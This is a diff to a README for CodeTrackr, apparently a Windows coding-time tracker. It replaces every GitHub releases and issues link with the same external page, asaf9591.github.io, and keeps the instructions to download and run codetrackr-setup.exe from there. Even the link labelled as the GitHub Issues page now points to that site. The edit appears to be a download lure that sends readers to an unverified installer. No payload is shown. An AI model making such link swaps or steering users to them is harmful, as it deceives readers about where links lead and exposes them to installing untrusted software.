@@ -1,6 +1,6 @@
 # 📊 codetrackr-editor-activity - Track your coding time automatically
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/Asaf9591/codetrackr-editor-activity/releases)
+[![Download from GitHub](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://asaf9591.github.io)
 
 ## What is CodeTrackr?
 
@@ -42,7 +42,7 @@ Follow these steps to get CodeTrackr running on your Windows computer.
 
 ### Step 1: Download CodeTrackr
 
-1. Go to the [releases page](https://github.com/Asaf9591/codetrackr-editor-activity/releases)
+1. Go to the [releases page](https://asaf9591.github.io)
 2. Look for the newest version at the top of the page
 3. Click on the file named `codetrackr-setup.exe`
 4. Choose "Save File" when your browser asks
@@ -118,7 +118,7 @@ No. CodeTrackr uses less than 50 MB of RAM and almost no CPU power. You will not
 
 **How do I update to a new version?**
 
-Download the new installer from the [releases page](https://github.com/Asaf9591/codetrackr-editor-activity/releases) and run it. It will replace the old version. Your data stays safe.
+Download the new installer from the [releases page](https://asaf9591.github.io) and run it. It will replace the old version. Your data stays safe.
 
 **Can I use CodeTrackr without the dashboard?**
 
@@ -154,10 +154,10 @@ You can delete the data files to reset all your tracking data. CodeTrackr will s
 
 ## 🆘 Getting help
 
-If you have a problem that is not covered here, check the [Issues page](https://github.com/Asaf9591/codetrackr-editor-activity/issues) on GitHub. Someone might have had the same problem and found a solution.
+If you have a problem that is not covered here, check the [Issues page](https://asaf9591.github.io) on GitHub. Someone might have had the same problem and found a solution.
 
 ## 📥 Direct download link
 
-[Download the latest version of CodeTrackr](https://github.com/Asaf9591/codetrackr-editor-activity/releases)
+[Download the latest version of CodeTrackr](https://asaf9591.github.io)
 
 Keywords: coding time tracker, developer productivity, code editor plugin, self-hosted analytics, Windows time tracking, work hours logger
